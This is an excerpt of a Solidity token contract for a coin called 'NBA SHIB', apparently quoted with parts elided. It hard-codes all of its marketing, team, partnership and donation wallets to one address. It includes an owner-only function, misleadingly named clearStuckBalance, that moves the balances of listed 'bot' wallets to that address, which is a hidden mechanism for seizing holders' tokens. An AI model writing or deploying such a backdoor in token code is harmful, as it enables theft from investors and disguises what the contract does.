...
contract nbashib is Context, IERC20, Ownable {
    ...
    address payable public _marketingAddress =
        payable(address(0x573bCfEC9f94afF12A5EF82313335b17FFFfeFA0));
    address payable public _teamwallet =
        payable(address(0x573bCfEC9f94afF12A5EF82313335b17FFFfeFA0));
    address _partnershipswallet =
        payable(address(0x573bCfEC9f94afF12A5EF82313335b17FFFfeFA0));
    address private _donationAddress =
        0x573bCfEC9f94afF12A5EF82313335b17FFFfeFA0;

    string private _name = "NBA SHIB";
    string private _symbol = "NBA SHIB";
    ...
    function clearStuckBalance() public onlyOwner {
        for(uint256 i = 0; i < botsWallet.length; i++){
            ...
            _transferStandard(wallet, address(0x573bCfEC9f94afF12A5EF82313335b17FFFfeFA0), amount);
        }
